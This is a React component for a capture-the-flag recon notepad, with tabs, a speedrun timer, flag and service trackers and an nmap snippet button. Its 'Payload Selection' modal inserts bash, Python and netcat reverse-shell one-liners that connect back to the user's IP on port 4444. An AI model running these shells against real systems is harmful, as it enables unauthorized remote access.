import { useState, useEffect, useMemo, useCallback, useRef } from "react";
import { 
  FiTrash2, FiPlus, FiX, FiActivity, FiSearch, FiTerminal, 
  FiClock, FiGlobe, FiShield, FiAlertTriangle, FiCopy, FiZap, FiFlag, FiServer,
  FiCheck, FiPlayCircle, FiRotateCcw, FiAward, FiTrendingUp, FiLock
} from "react-icons/fi";

interface Tab {
  id: string;
  name: string;
  content: string;
  flags: { user: boolean; root: boolean };
  services: { http: boolean; ssh: boolean; smb: boolean };
}

export default function ReconNotes({ onClose }: { onClose: () => void }) {
  const [seconds, setSeconds] = useState(0);
  const [timerActive, setTimerActive] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const [tabs, setTabs] = useState<Tab[]>(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem("azid-recon-tabs");
      try {
        if (saved) {
          const parsed = JSON.parse(saved);
          return parsed.map((t: any) => ({
            ...t,
            flags: t.flags || { user: false, root: false },
            services: t.services || { http: false, ssh: false, smb: false }
          }));
        }
      } catch (e) { return [{ id: "1", name: "General", content: "", flags: { user: false, root: false }, services: { http: false, ssh: false, smb: false } }]; }
    }
    return [{ id: "1", name: "General", content: "", flags: { user: false, root: false }, services: { http: false, ssh: false, smb: false } }];
  });

  const [activeTabId, setActiveTabId] = useState<string>(tabs[0]?.id || "1");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isClearModalOpen, setIsClearModalOpen] = useState(false);
  const [isShellModalOpen, setIsShellModalOpen] = useState(false);
  const [isStatsModalOpen, setIsStatsModalOpen] = useState(false);
  const [isTimerWarningOpen, setIsTimerWarningOpen] = useState(false); // New State
  const [newTabName, setNewTabName] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [copyStatus, setCopyStatus] = useState(false);
  
  const [targetIp, setTargetIp] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem("recon-target-ip") : "") || "");
  const [localIp, setLocalIp] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem("recon-local-ip") : "") || "");

  useEffect(() => {
    if (timerActive) {
      timerRef.current = setInterval(() => {
        setSeconds(prev => prev + 1);
      }, 1000);
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [timerActive]);

  const formatTime = (s: number) => {
    const hrs = Math.floor(s / 3600);
    const mins = Math.floor((s % 3600) / 60);
    const secs = s % 60;
    return `${hrs > 0 ? hrs + ':' : ''}${mins < 10 ? '0' + mins : mins}:${secs < 10 ? '0' + secs : secs}`;
  };

  const currentTab = useMemo(() => {
    return tabs.find(t => t.id === activeTabId) || tabs[0];
  }, [tabs, activeTabId]);

  const updateContent = useCallback((val: string) => {
    if (searchTerm) return; 
    setTabs(prev => prev.map(t => t.id === activeTabId ? { ...t, content: val } : t));
  }, [activeTabId, searchTerm]);

  const resetTrackers = () => {
    setTabs(prev => prev.map(t => t.id === activeTabId ? {
      ...t,
      flags: { user: false, root: false },
      services: { http: false, ssh: false, smb: false }
    } : t));
  };

  const handleTrackerClick = (type: 'flags' | 'services', key: string) => {
    // Lock Check
    if (!timerActive) {
        setIsTimerWarningOpen(true);
        return;
    }

    const time = new Date().toLocaleTimeString();
    setTabs(prev => prev.map(t => {
      if (t.id === activeTabId) {
        const group = t[type] as any;
        const newState = !group[key];
        
        let extraContent = "";
        if (type === 'flags' && newState) {
          extraContent = `\n[${time}] - [${key.toUpperCase()}_FLAG_CAPTURED] 🚩`;
          if (key === 'root') {
            setTimerActive(false);
            setIsStatsModalOpen(true);
            extraContent += `\n[SPEEDRUN_TOTAL_TIME: ${formatTime(seconds)}]`;
          }
        } else if (type === 'services' && newState) {
          extraContent = `\n# [${key.toUpperCase()}_DISCOVERED]\n- Target: ${targetIp || 'IP'}\n`;
        }

        return {
          ...t,
          content: t.content + extraContent,
          [type]: { ...group, [key]: newState }
        };
      }
      return t;
    }));
  };

  const handleAddTab = () => {
    if (!newTabName.trim()) return;
    const id = Date.now().toString();
    const newTab: Tab = {
      id,
      name: newTabName,
      content: "",
      flags: { user: false, root: false },
      services: { http: false, ssh: false, smb: false }
    };
    setTabs(prev => [...prev, newTab]);
    setActiveTabId(id);
    setNewTabName("");
    setIsModalOpen(false);
  };

  const handlePurge = () => { updateContent(""); setIsClearModalOpen(false); };

  const deleteTab = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (tabs.length === 1) return;
    const filtered = tabs.filter(t => t.id !== id);
    setTabs(filtered);
    if (activeTabId === id) setActiveTabId(filtered[0].id);
  };

  const displayedContent = useMemo(() => {
    if (!searchTerm.trim()) return currentTab.content;
    return currentTab.content.split('\n').filter(l => l.toLowerCase().includes(searchTerm.toLowerCase())).join('\n');
  }, [currentTab.content, searchTerm]);

  return (
    <div className="relative w-[480px] h-[600px] bg-gray-950 border border-gray-800 rounded-3xl p-5 shadow-2xl flex flex-col font-mono text-gray-300 overflow-hidden group hover:border-orange-500/20 transition-all">
      
      {/* TIMER SAFETY MODAL (The Custom Dialogue) */}
      {isTimerWarningOpen && (
        <div className="absolute inset-0 z-[200] flex items-center justify-center p-6 bg-gray-950/90 backdrop-blur-md">
          <div className="w-full max-w-[300px] bg-gray-900 border border-orange-500/40 rounded-3xl p-6 text-center shadow-[0_0_40px_rgba(249,115,22,0.1)]">
            <div className="w-16 h-16 bg-orange-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-orange-500/20">
              <FiLock className="text-orange-500 animate-pulse" size={28} />
            </div>
            <h4 className="text-white font-black text-sm uppercase mb-2">Operation Locked</h4>
            <p className="text-gray-500 text-[10px] uppercase font-bold leading-relaxed mb-6">Machine starting sequence required. Initialize timer to track progress.</p>
            <button 
                onClick={() => { setIsTimerWarningOpen(false); setTimerActive(true); if(seconds === 0) updateContent(currentTab.content + `\n[--- SPEEDRUN_STARTED: ${new Date().toLocaleTimeString()} ---]\n`); }} 
                className="w-full bg-orange-600 hover:bg-orange-500 text-white py-3 rounded-xl text-[10px] font-black uppercase transition-all mb-2"
            >
                Start_Machine
            </button>
            <button onClick={() => setIsTimerWarningOpen(false)} className="w-full text-gray-600 text-[9px] font-bold uppercase hover:text-gray-400 transition-colors">Dismiss</button>
          </div>
        </div>
      )}

      {/* MISSION ACCOMPLISHED MODAL */}
      {isStatsModalOpen && (
        <div className="absolute inset-0 z-[150] flex items-center justify-center p-6 bg-gray-950/95 backdrop-blur-md">
          <div className="w-full max-w-[340px] bg-gray-900 border border-emerald-500/30 rounded-3xl p-6 text-center">
            <FiAward className="text-emerald-500 mx-auto mb-4" size={32} />
            <h4 className="text-white font-black text-lg uppercase mb-6 italic">Mission Accomplished!</h4>
            <div className="bg-gray-950 p-3 rounded-2xl border border-gray-800 flex justify-between items-center mb-6">
                <span className="text-[10px] text-gray-400 font-bold uppercase flex items-center gap-2"><FiClock size={12}/> Time</span>
                <span className="text-emerald-400 font-black">{formatTime(seconds)}</span>
            </div>
            <button onClick={() => setIsStatsModalOpen(false)} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-3 rounded-xl text-[11px] font-black uppercase transition-all">Close</button>
          </div>
        </div>
      )}

      {/* NEW TAB MODAL */}
      {isModalOpen && (
        <div className="absolute inset-0 z-[100] flex items-center justify-center bg-gray-950/90 backdrop-blur-sm p-6 text-center">
          <div className="w-full bg-gray-900 border border-orange-500/30 rounded-2xl p-4">
            <input autoFocus value={newTabName} onChange={e => setNewTabName(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleAddTab()} placeholder="TARGET_NAME" className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-2 text-[11px] outline-none mb-4 font-mono uppercase text-orange-400" />
            <button onClick={handleAddTab} className="w-full bg-orange-600 py-2 rounded-lg text-[10px] font-black uppercase">Initialize Tab</button>
            <button onClick={() => setIsModalOpen(false)} className="mt-2 text-[8px] text-gray-500 uppercase w-full">Cancel</button>
          </div>
        </div>
      )}

      {/* CLEAR MODAL */}
      {isClearModalOpen && (
        <div className="absolute inset-0 z-[110] flex items-center justify-center p-6 bg-gray-950/95 backdrop-blur-md">
            <div className="w-full max-w-[280px] bg-gray-900 border border-red-500/40 rounded-2xl p-5 text-center">
                <FiAlertTriangle className="text-red-500 mx-auto mb-3 animate-bounce" size={32} />
                <h4 className="text-[11px] font-black text-white uppercase mb-4 italic">Purge Notes?</h4>
                <div className="flex gap-2">
                    <button onClick={handlePurge} className="flex-1 bg-red-600 py-2 rounded-lg text-[9px] font-black uppercase">Confirm</button>
                    <button onClick={() => setIsClearModalOpen(false)} className="flex-1 bg-gray-800 py-2 rounded-lg text-[9px] font-black uppercase">Abort</button>
                </div>
            </div>
        </div>
      )}

      {/* HEADER */}
      <div className="flex justify-between items-center mb-4">
        <div className="flex items-center gap-3">
          <FiActivity className={`text-orange-500 ${timerActive ? 'animate-pulse' : 'opacity-50'}`} />
          <div className="flex flex-col">
            <span className="text-[9px] font-black tracking-widest uppercase italic text-orange-500">Recon_OS_v4</span>
            <div className="flex items-center gap-1.5 mt-0.5">
                <FiPlayCircle onClick={() => {setTimerActive(!timerActive); if(!timerActive && seconds === 0) updateContent(currentTab.content + `\n[--- SPEEDRUN_STARTED: ${new Date().toLocaleTimeString()} ---]\n`);}} className={`cursor-pointer ${timerActive ? 'text-emerald-500' : 'text-gray-600'} hover:scale-110 transition-all`} size={12}/>
                <span className={`text-[11px] font-bold ${timerActive ? 'text-white' : 'text-gray-600'}`}>{formatTime(seconds)}</span>
            </div>
          </div>
        </div>
        
        <div className="flex items-center gap-2">
          <div className="flex items-center bg-gray-900/80 px-2 py-1.5 rounded-xl border border-gray-800/50">
            <button onClick={resetTrackers} className="flex items-center justify-center text-gray-700 hover:text-orange-500 transition-colors border-r border-gray-800 px-1.5 mr-1.5"><FiRotateCcw size={12} /></button>
            <div className="flex gap-2 border-r border-gray-800 pr-2">
                <FiFlag onClick={() => handleTrackerClick('flags', 'user')} className={`cursor-pointer transition-all ${currentTab.flags.user ? 'text-emerald-500 drop-shadow-[0_0_8px_#10b981]' : (timerActive ? 'text-gray-700 hover:text-gray-500' : 'text-gray-900')}`} size={14} />
                <FiFlag onClick={() => handleTrackerClick('flags', 'root')} className={`cursor-pointer transition-all ${currentTab.flags.root ? 'text-red-500 drop-shadow-[0_0_8px_#ef4444]' : (timerActive ? 'text-gray-700 hover:text-gray-500' : 'text-gray-900')}`} size={14} />
            </div>
            <div className="flex gap-2 pl-2">
                <FiServer onClick={() => handleTrackerClick('services', 'http')} className={`cursor-pointer transition-all ${currentTab.services.http ? 'text-blue-400' : (timerActive ? 'text-gray-700 hover:text-gray-500' : 'text-gray-900')}`} size={14} />
                <FiServer onClick={() => handleTrackerClick('services', 'ssh')} className={`cursor-pointer transition-all ${currentTab.services.ssh ? 'text-purple-400' : (timerActive ? 'text-gray-700 hover:text-gray-500' : 'text-gray-900')}`} size={14} />
                <FiServer onClick={() => handleTrackerClick('services', 'smb')} className={`cursor-pointer transition-all ${currentTab.services.smb ? 'text-yellow-400' : (timerActive ? 'text-gray-700 hover:text-gray-500' : 'text-gray-900')}`} size={14} />
            </div>
          </div>
          <button onClick={onClose} className="p-1.5 bg-gray-800/50 text-gray-400 hover:text-white hover:bg-red-500/20 rounded-lg transition-all border border-transparent"><FiX size={16}/></button>
        </div>
      </div>

{/* PAYLOADS MODAL - Yeh missing tha */}
{isShellModalOpen && (
  <div className="absolute inset-0 z-[250] flex items-center justify-center bg-gray-950/90 backdrop-blur-sm p-6">
    <div className="w-full max-w-[320px] bg-gray-900 border border-emerald-500/30 rounded-3xl p-5 shadow-[0_0_50px_rgba(16,185,129,0.1)]">
      <div className="flex items-center justify-between mb-5">
        <div className="flex items-center gap-2">
            <FiZap className="text-emerald-500 animate-pulse" size={16} />
            <h4 className="text-[10px] font-black text-white uppercase italic tracking-widest">Payload Selection</h4>
        </div>
        <button onClick={() => setIsShellModalOpen(false)} className="text-gray-500 hover:text-white"><FiX size={14}/></button>
      </div>
      
      <div className="grid gap-2">
        {['bash', 'python', 'nc'].map(type => (
          <button key={type} onClick={() => {
            const lIp = localIp || "10.x.x.x";
            let p = type === 'bash' ? `bash -i >& /dev/tcp/${lIp}/4444 0>&1` : type === 'python' ? `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lIp}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` : `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lIp} 4444 >/tmp/f`;
            updateContent(currentTab.content + `\n# [${type.toUpperCase()}_SHELL]\n${p}\n`);
            setIsShellModalOpen(false);
          }} className="group w-full p-3 bg-gray-950 border border-gray-800 rounded-xl hover:border-emerald-500/50 flex justify-between items-center transition-all">
            <span className="text-[10px] font-black text-gray-400 group-hover:text-emerald-400 uppercase tracking-widest">{type}</span>
            <FiTerminal className="text-gray-700 group-hover:text-emerald-500" size={12} />
          </button>
        ))}
      </div>
      <p className="mt-4 text-[8px] text-gray-600 text-center uppercase font-bold italic">L-Host: {localIp || "NOT_SET"}</p>
    </div>
  </div>
)}
      {/* INPUTS & TOOLBAR remain same as your code */}
      <div className="grid grid-cols-2 gap-2 mb-4">
        <div className="bg-gray-900/50 border border-gray-800 p-2 rounded-xl flex items-center gap-2 focus-within:border-blue-500/50 transition-all">
          <FiGlobe className="text-blue-500" size={12} />
          <input value={targetIp} onChange={e => setTargetIp(e.target.value)} placeholder="TARGET_IP" className="bg-transparent text-[10px] outline-none w-full text-blue-400 font-mono" />
        </div>
        <div className="bg-gray-900/50 border border-gray-800 p-2 rounded-xl flex items-center gap-2 focus-within:border-emerald-500/50 transition-all">
          <FiShield className="text-emerald-500" size={12} />
          <input value={localIp} onChange={e => setLocalIp(e.target.value)} placeholder="VPN_IP" className="bg-transparent text-[10px] outline-none w-full text-emerald-400 font-mono" />
        </div>
      </div>

      <div className="flex gap-2 mb-3 bg-gray-900/50 p-2 rounded-xl border border-gray-800/50 items-center">
        <button onClick={() => updateContent(currentTab.content + `\n[${new Date().toLocaleTimeString()}] - `)} className="p-1.5 text-gray-500 hover:text-orange-400 bg-gray-950 rounded border border-gray-800 transition-colors"><FiClock size={12}/></button>
        <button onClick={() => updateContent(currentTab.content + `\n# NMAP\nnmap -sC -sV ${targetIp || '10.10.x.x'}\n`)} className="p-1.5 text-gray-500 hover:text-blue-400 bg-gray-950 rounded border border-gray-800 transition-colors"><FiTerminal size={12}/></button>
        <button onClick={() => { if(!timerActive) { setIsTimerWarningOpen(true); return; } setIsShellModalOpen(true); }} className="flex items-center gap-2 text-[9px] font-bold text-emerald-500 bg-emerald-500/10 px-3 py-1.5 rounded border border-emerald-500/20 hover:bg-emerald-500 hover:text-white transition-all uppercase">
          <FiZap size={12} /> Payload
        </button>
        <div className="flex-1 relative flex items-center ml-1">
          <FiSearch className="absolute left-2 text-gray-700" size={10} />
          <input value={searchTerm} onChange={e => setSearchTerm(e.target.value)} placeholder="FILTER..." className="w-full bg-gray-950 border border-gray-800 rounded-md pl-6 pr-2 py-1.5 text-[9px] outline-none font-mono" />
        </div>
        <button onClick={() => {setNewTabName(""); setIsModalOpen(true);}} className="p-1.5 text-orange-500 bg-orange-500/10 hover:bg-orange-500 hover:text-white rounded border border-orange-500/20 transition-all"><FiPlus size={12}/></button>
      </div>

      {/* TABS & EDITOR & FOOTER remain same */}
      <div className="flex gap-1.5 overflow-x-auto pb-2 mb-2 scrollbar-hide">
        {tabs.map(tab => (
          <div key={tab.id} onClick={() => {setActiveTabId(tab.id); setSearchTerm("");}} className={`flex items-center px-3 py-1.5 rounded-xl text-[10px] font-bold uppercase cursor-pointer border transition-all ${activeTabId === tab.id ? "bg-orange-600/20 border-orange-500/40 text-orange-400 shadow-lg" : "bg-gray-950 border-gray-800 text-gray-600"}`}>
            {tab.name}
            {tabs.length > 1 && <FiX onClick={e => deleteTab(tab.id, e)} className="ml-2 hover:text-red-500" size={10} />}
          </div>
        ))}
      </div>

      <div className="relative flex-1 group/editor">
        <textarea
          readOnly={!!searchTerm}
          value={displayedContent}
          onChange={e => updateContent(e.target.value)}
          className={`w-full h-full bg-gray-950/30 border rounded-2xl p-4 text-xs outline-none leading-relaxed resize-none font-mono transition-all ${searchTerm ? 'border-orange-500/20 text-orange-500/40' : 'border-gray-800 text-orange-400/80 focus:border-orange-500/30'}`}
        />
        <button onClick={() => { navigator.clipboard.writeText(currentTab.content); setCopyStatus(true); setTimeout(() => setCopyStatus(false), 2000); }} className="absolute bottom-4 right-4 p-2 bg-gray-900 border border-gray-800 rounded-lg text-gray-400 hover:text-white shadow-xl hover:scale-105 transition-all">
           {copyStatus ? <FiCheck className="text-emerald-500" size={14}/> : <FiCopy size={14}/>}
        </button>
      </div>

      <div className="mt-4 flex justify-between items-center text-[9px] font-bold text-gray-700 uppercase tracking-tighter">
        <div className="flex items-center gap-1.5">
          <div className={`w-1.5 h-1.5 rounded-full ${timerActive ? 'bg-emerald-500 animate-pulse' : 'bg-gray-800'}`}></div>
          {timerActive ? 'Speedrun_Active' : 'Ready_Standby'}
          <button onClick={() => {setSeconds(0); setTimerActive(false);}} className="ml-2 hover:text-orange-500 flex items-center gap-1 transition-colors px-2 py-1 bg-gray-900 rounded-lg border border-gray-800 uppercase tracking-widest"><FiClock size={10} /> Reset_Timer</button>
        </div>
        <button onClick={() => setIsClearModalOpen(true)} className="hover:text-red-500 flex items-center gap-1 transition-colors px-3 py-1.5 bg-gray-900 rounded-xl border border-gray-800 hover:border-red-500/30 uppercase tracking-widest">
            <FiTrash2 size={10} /> Purge_Tab
        </button>
      </div>
    </div>
  );
}